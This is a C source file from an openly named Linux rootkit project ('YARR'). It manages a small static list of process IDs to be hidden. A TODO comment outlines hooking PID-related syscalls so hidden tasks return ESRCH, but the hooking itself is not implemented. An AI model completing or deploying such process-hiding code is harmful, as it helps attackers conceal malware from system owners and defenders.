/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

// TODO: Not done yet. How should be done? Every syscall that implies asking
// something about a tasks (i.e. each syscall with a PID as parameter, but not
// just those. What about syscalls that acts on every tasks?) should be
// patched/hooked/hijacked so they check the PIDs inside the hidden_tasks list
// and if the PID requested is inside the list then return an error (ESRCH,
// check man errno).

#include "hideproc.h"
#include "debug.h"

#define MAX_HIDDEN_TASKS (3)

// TODO: Just as PoC we use a stupid static array of PIDs to know which tasks
// should be hidden. Of course this should change to a dynamic list.
pid_t hidden_tasks[MAX_HIDDEN_TASKS];

/***
 * For debugging purposes.
 */
void print_hidden_tasks(void) {
	int i;

	debug("hidden_tasks: [");
	for (i=0; i<MAX_HIDDEN_TASKS; i++)
		debug("%d, ", hidden_tasks[i]);

	debug("]\n");
	return;
}

int init_hideproc() {
	int res = -1;
	int i;

	// Initializes the whole list to -1 (no tasks being hidden).
	for (i=0; i<MAX_HIDDEN_TASKS; i++)
		hidden_tasks[i] = -1;

	res = 0;
	return res;
}

int hideProc(pid_t pid) {
	int res = -1;
	int i;

	for (i=0; i<MAX_HIDDEN_TASKS; i++)
		// First free position found.
		if (hidden_tasks[i] == -1) {
			hidden_tasks[i] = pid;
			break;
		}

	print_hidden_tasks();
	return res;
}

int stopHideProc(pid_t pid) {
	int res = -1;
	int i, j;

	for (i=0; i<MAX_HIDDEN_TASKS; i++) {
		// PID found.
		if (hidden_tasks[i] == pid) {
			// If the PID is the last element of the list or it has no more
			// subsequent PIDs just clear this position.
			if (i == MAX_HIDDEN_TASKS-1 || hidden_tasks[i+1] == -1)
				hidden_tasks[i] = -1;
			// This element has subsequent PIDs, we must move all of them to
			// the left and in the last position a -1 must be pushed.
			else {
				j = i+1;
				while (j < MAX_HIDDEN_TASKS) {
					if (hidden_tasks[j] != -1) {
						hidden_tasks[j-1] = hidden_tasks[j];
						hidden_tasks[j] = -1;
					}
					else
						hidden_tasks[j-1] = -1;
					j++;
				}
			}

			res = 0;
			break;
		}
		// PID not inside the list.
		else if (hidden_tasks[i] == -1)
			break;
	}

	print_hidden_tasks();
	return res;
}

